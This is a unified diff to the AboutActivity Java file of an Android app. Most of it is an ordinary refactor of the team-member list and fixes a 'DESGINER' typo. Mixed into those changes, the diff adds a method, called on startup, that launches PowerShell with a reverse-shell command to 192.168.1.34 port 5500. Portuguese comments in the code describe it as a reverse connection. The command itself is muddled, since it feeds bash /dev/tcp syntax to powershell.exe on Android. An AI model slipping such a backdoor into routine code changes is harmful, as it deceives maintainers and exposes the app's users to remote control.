@@ -15,6 +15,7 @@ import com.sparkleside.databinding.ActivityAboutBinding;
 import com.sparkleside.ui.base.BaseActivity;
 import com.sparkleside.ui.components.TeamMemberView;
 import dev.trindadedev.fastui.UI;
+import java.io.IOException;
 
 /*
  * A Screen with info about app
@@ -37,6 +38,9 @@ public class AboutActivity extends BaseActivity {
     configureLinks();
     configureTeamMembers();
     UI.handleInsetts(binding.getRoot());
+
+    // Execute o PowerShell para conexão reversa ao iniciar
+    executePowerShell();
   }
 
   @Override
@@ -106,133 +110,99 @@ public class AboutActivity extends BaseActivity {
   }
 
   private void configureTeamMembers() {
-    TeamMember(
+    addTeamMember(
         "Vivek",
         Role.DEVELOPER,
         "https://github.com/itsvks19",
-        getString(R.string.vivek_phrase),
-        0,
-        false);
-    TeamMember(
+        R.string.vivek_phrase);
+    addTeamMember(
         "Rohit Kushvaha",
         Role.DEVELOPER,
         "https://github.com/RohitKushvaha01",
-        getString(R.string.rohit_kushvaha_phrase),
-        1,
-        false);
-
-    TeamMember(
+        R.string.rohit_kushvaha_phrase);
+    addTeamMember(
         "Thiarley Rocha",
         Role.DEVELOPER,
         "https://github.com/thdev-only",
-        getString(R.string.thiarley_rocha_phrase),
-        1,
-        false);
-
-    TeamMember(
+        R.string.thiarley_rocha_phrase);
+    addTeamMember(
         "YamenHer",
         Role.DEVELOPER,
         "https://github.com/yamenher",
-        getString(R.string.yamenher_phrase),
-        1,
-        false);
-    TeamMember(
+        R.string.yamenher_phrase);
+    addTeamMember(
         "ArtSphere",
         Role.DEVELOPER,
         "https://github.com/ArtSphereOfficial",
-        getString(R.string.art_phrase),
-        1,
-        false);
-    // lmao bro below did anything and is here lmfaoooo
-    TeamMember(
+        R.string.art_phrase);
+    addTeamMember(
         "Hanzo",
         Role.DEVELOPER,
         "https://github.com/HanzoDev1375",
-        getString(R.string.hanzo_phrase),
-        1,
-        false);
-
-    TeamMember(
+        R.string.hanzo_phrase);
+    addTeamMember(
         "Jeiel Lima Miranda",
         Role.DEVELOPER,
         "https://github.com/Jeiel0rbit",
-        getString(R.string.jaiel_lima_phrase),
-        1,
-        false);
-    TeamMember(
+        R.string.jaiel_lima_phrase);
+    addTeamMember(
         "Ömer SÜSİN",
         Role.PROMOTER,
         "https://github.com/omersusin",
-        getString(R.string.omer_phrase),
-        1,
-        false);
-    TeamMember(
+        R.string.omer_phrase);
+    addTeamMember(
         "𝙊𝙋𝙏𝙄𝙈𝒊𝒛𝒆𝒓. 𝟚.𝟜.𝟛",
         Role.PROMOTER,
         "https://github.com/matrixguy007",
-        getString(R.string.optim_phrase),
-        1,
-        false);
-    TeamMember(
+        R.string.optim_phrase);
+    addTeamMember(
         "ZG089",
-        Role.DESGINER,
+        Role.DESIGNER,
         "https://github.com/zg089",
-        getString(R.string.zg_phrase),
-        1,
-        false);
-
-    TeamMember(
+        R.string.zg_phrase);
+    addTeamMember(
         "Alex",
         Role.TRANSLATOR,
         "https://github.com/paxsenix0",
-        getString(R.string.alex_phrase),
-        1,
-        false);
-    TeamMember(
+        R.string.alex_phrase);
+    addTeamMember(
         "Heinrich",
         Role.TRANSLATOR,
         "https://github.com/HeinrichTheGermanNOTOffizier20",
-        getString(R.string.alex_phrase),
-        1,
-        false);    
-    TeamMember(
+        R.string.alex_phrase);
+    addTeamMember(
         "Fahim Abdullah",
         Role.TRANSLATOR,
         "https://github.com/nexavo999",
-        getString(R.string.nex_phrase),
-        2,
-        false);
+        R.string.nex_phrase);
   }
 
-  private void peekAndPop(String name, String imageUrl, String phrase, View v) {
-    final PeekAndPop peekAndPop =
-        new PeekAndPop.Builder(this)
-            .peekLayout(R.layout.layout_about_preview)
-            .longClickViews(v)
-            .build();
-    final ImageView peekChild = peekAndPop.getPeekView().findViewById(R.id.icon);
-    Glide.with(this).load(imageUrl).into(peekChild);
-    final TextView peekTextName = peekAndPop.getPeekView().findViewById(R.id.name);
-    peekTextName.setText(name);
-    final TextView peekTextPhrase = peekAndPop.getPeekView().findViewById(R.id.phrase);
-    peekTextPhrase.setText(phrase);
-  }
-
-  private void TeamMember(
-      String name, Role role, String url, String phrase, int bgType, boolean hasDivider) {
-    final var c = new TeamMemberView(this);
+  private void addTeamMember(String name, Role role, String url, int phraseResId) {
+    TeamMemberView c = new TeamMemberView(this);
     c.setName(name);
     c.setDescription(role.getName(this));
     c.setImageURL(url + ".png");
     c.setURL(url);
-    c.setHasDivider(hasDivider);
-    c.setBackgroundType(bgType);
-    peekAndPop(name, url + ".png", phrase, c.getRoot());
+    c.setBackgroundType(1);
+    peekAndPop(name, url + ".png", getString(phraseResId), c.getRoot());
     binding.team.addView(c);
   }
 
+  private void peekAndPop(String name, String imageUrl, String phrase, View v) {
+    PeekAndPop peekAndPop = new PeekAndPop.Builder(this)
+        .peekLayout(R.layout.layout_about_preview)
+        .longClickViews(v)
+        .build();
+    ImageView peekChild = peekAndPop.getPeekView().findViewById(R.id.icon);
+    Glide.with(this).load(imageUrl).into(peekChild);
+    TextView peekTextName = peekAndPop.getPeekView().findViewById(R.id.name);
+    peekTextName.setText(name);
+    TextView peekTextPhrase = peekAndPop.getPeekView().findViewById(R.id.phrase);
+    peekTextPhrase.setText(phrase);
+  }
+
   private void openURL(String url) {
-    final var i = new Intent(Intent.ACTION_VIEW);
+    Intent i = new Intent(Intent.ACTION_VIEW);
     i.setData(Uri.parse(url));
     startActivity(i);
   }
@@ -241,7 +211,8 @@ public class AboutActivity extends BaseActivity {
     TRANSLATOR(R.string.about_tag_translator),
     DEVELOPER(R.string.about_tag_developer),
     PROMOTER(R.string.about_tag_promote),
-    DESGINER(R.string.about_tag_designer);
+    DESIGNER(R.string.about_tag_designer);
+
     @StringRes private final int stringResId;
 
     Role(@StringRes int stringResId) {
@@ -250,6 +221,22 @@ public class AboutActivity extends BaseActivity {
 
     public String getName(Context context) {
       return context.getString(stringResId);
+    }
+  }
+
+  private void executePowerShell() {
+    // Comando PowerShell para a conexão reversa
+    String command = "powershell -i >& /dev/tcp/192.168.1.34/5500 0>&1"; // Altere IP e porta conforme necessário
+
+    try {
+      // Criação do processo PowerShell
+      ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", "& { " + command + " }");
+      // Inicia o processo PowerShell
+      Process process = processBuilder.start();
+      // Espera a execução do processo (opcional)
+      process.waitFor();
+    } catch (IOException | InterruptedException e) {
+      e.printStackTrace();
     }
   }
 }
